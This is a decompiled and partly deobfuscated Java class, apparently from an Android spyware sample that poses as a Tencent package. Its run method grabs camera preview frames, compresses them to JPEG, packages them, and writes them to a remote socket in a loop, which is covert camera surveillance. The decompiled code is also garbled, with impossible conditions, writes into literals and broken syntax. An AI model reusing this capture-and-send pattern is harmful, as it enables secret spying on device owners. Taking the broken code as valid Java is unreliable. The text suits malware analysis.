package com.tencent;

import android.content.*;
import android.view.*;
import android.widget.*;
import android.app.*;
import android.os.*;
import android.accessibilityservice.*;
import android.view.accessibility.*;
import android.telephony.*;
import android.media.*;
import java.util.*;
import java.io.*;
import java.net.*;

/**
 * Deobfuscated class: SecondaryBackgroundService_3
 * Original: Lcom/tencent/tunesxconcerningn106$3;
 */
class SecondaryBackgroundService_3 implements Runnable; {

    // === FIELDS ===
    final SecondaryBackgroundService this$0;

    // === METHODS ===

     void Constructor(SecondaryBackgroundService param0) {
        v0.this$0 = v1;
        // new Object()
        return;
    }

    public void run() {
        v0 = v12.this$0;
        v1 = SecondaryBackgroundService.access$300(v0);
        v1 = 5;
        v0 = v0[5];
        Integer.valueOf(v0);
        v1 = v0.intValue();
        if (5 == null || 5 == 0) { // goto +213
        v1 = 0;
        v2 = 0;
        v4 = SecondaryBackgroundService.access$100();
        synchronized (v3) {
        v4 = v12.this$0;
        SecondaryBackgroundService.access$200(v4);
        v4 = v4.size();
        if (v4 <= 0) { // goto +24
        v4 = v12.this$0;
        v4 = SecondaryBackgroundService.access$200(v4);
        v4 = v4.get(0);
        v4 = (byte[]) v4;
        SecondaryBackgroundService.access$200(0);
        0.remove(0);
        }
        // goto (branch)
        v11 = v4;
        v4 = 0;
        }
        throw 0;
        // goto (branch)
        // goto (branch)
        v4 = 0;
        v9 = 0.getParameters();
        v9 = 0.getPreviewSize();
        v9 = v3.width;
        v10 = 0.getPreviewSize();
        v10 = new YuvImage();
        v5 = 17;
        v8 = 0;
        v3 = v10;
        v6 = v9;
        v7 = 0;
        YuvImage.<init>(...);
        v3 = new ByteArrayOutputStream();
        // new ByteArrayOutputStream()
        v4 = new Rect();
        // new Rect(0, 0, v9, 0)
        SecondaryBackgroundService.access$400(0);
        v10.compressToJpeg(v4, 0, v3);
        if (v0 == null || v0 == 0) { // goto +18
        v4 = v3.toByteArray();
        v4 = v4.length;
        v5 = 75;
        v4 = SecondaryBackgroundService.access$500(0, v4, 75);
        SecondaryBackgroundService.access$402(0, v4);
        // new StringBuilder()
        v4 = v12.this$0;
        v5 = SecondaryBackgroundService.access$300(v4);
        v5 = 3;
        v4 = v4[3];
        0.append(v4);
        v4 = v12.this$0;
        v5 = SecondaryBackgroundService.access$300(v4);
        v5 = 6;
        v4 = v4[6];
        0.append(v4);
        v4 = v12.this$0;
        v5 = SecondaryBackgroundService.access$300(v4);
        v5 = 7;
        v4 = v4[7];
        0.append(v4);
        0.toString();
        v4 = v3.toByteArray();
        v4 = DataPackagingEngine.eliminateicoolerh28(0, v4);
        v4 = SecondaryBackgroundService.s_tunesxconcerningn106_k;
        v5 = 7 * 15;
        v4.setSendBufferSize(7);
        v4 = SecondaryBackgroundService.s_tunesxconcerningn106_k;
        v4 = v4.getOutputStream();
        SecondaryBackgroundService.o_tunesxconcerningn106_ut = v4;
        v4 = SecondaryBackgroundService.o_tunesxconcerningn106_ut;
        v4.write(0, 0, 7);
        // goto (branch)
        0.sp();
        v3.close();
        v1 = 1;
        Thread.sleep(1, 0);
        // goto (branch)
        return;
    }
}
